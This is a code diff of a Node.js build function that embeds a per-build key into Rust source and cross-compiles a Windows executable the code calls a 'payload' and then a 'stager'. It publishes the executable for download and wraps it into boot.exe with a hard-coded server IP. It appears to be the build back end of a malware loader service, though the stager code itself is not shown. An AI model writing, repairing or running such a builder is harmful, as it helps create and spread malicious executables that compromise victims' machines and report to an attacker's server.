@@ -16,58 +16,30 @@ export async function buildBoot({ key, buildId }) {
   if (!fs.existsSync(rustDir)) rustDir = ROOT_DIR;
 
   const srcDir = path.join(rustDir, 'src');
-  if (!fs.existsSync(srcDir)) {
-    fs.mkdirSync(srcDir, { recursive: true });
-  }
+  if (!fs.existsSync(srcDir)) fs.mkdirSync(srcDir, { recursive: true });
 
   const embeddedKeyPath = path.join(srcDir, 'embedded_key.rs');
   fs.writeFileSync(embeddedKeyPath, `pub const ACCOUNT_KEY: &str = "${key}";\n`);
 
-  console.log('[build] compiling rust payload...');
+  console.log('[build] compiling rust stager...');
   try {
-    // -j 1 prevents the 4GB server from running out of RAM
-    await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu', '-j', '1'], {
+    await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu'], {
       cwd: rustDir,
-      timeout: 30 * 60_000, // 30 minutes
+      timeout: 5 * 60_000,
       maxBuffer: 64 * 1024 * 1024,
-      env: {
-        ...process.env,
-        CARGO_BUILD_JOBS: "1",
-      }
     });
   } catch (e) {
-    if (e.killed) {
-      throw new Error('cargo failed: Build timed out after 30 minutes.');
-    }
     const fullLog = (e.stdout || '') + '\n' + (e.stderr || '');
-    const errorLines = fullLog.split('\n').filter(l => l.includes('error[') || l.includes('error:') || l.includes('panicked') || l.includes('Killed'));
-    
-    const actualError = errorLines.length > 0 
-      ? errorLines.join('\n') 
-      : "Server ran out of memory and killed the compiler. Try again.";
-
-    console.error('[build] cargo failed:', actualError);
-    throw new Error(`cargo failed:\n${actualError}`);
+    throw new Error(`cargo failed:\n${fullLog.slice(-2000)}`);
   }
 
-  // Look for boot.exe (since your Cargo.toml names it "boot")
   const baseExe = path.join(rustDir, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
-  if (!fs.existsSync(baseExe)) {
-    throw new Error(`rust build missing output at ${baseExe}`);
-  }
+  if (!fs.existsSync(baseExe)) throw new Error(`rust build missing output at ${baseExe}`);
 
-  // Copy to download/st.exe
   if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
   fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.exe'));
 
-  console.log('[build] wrapping into final boot.exe...');
-  
-  const bootBuf = await compileLauncher({ 
-    key, 
-    buildId,
-    config: { ip: process.env.SERVER_IP || '95.182.96.216' }, 
-    baseExe 
-  });
-  
+  console.log('[build] wrapping into boot.exe...');
+  const bootBuf = await compileLauncher({ key, buildId, config: { ip: process.env.SERVER_IP || '95.182.96.216' }, baseExe });
   return bootBuf;
 }
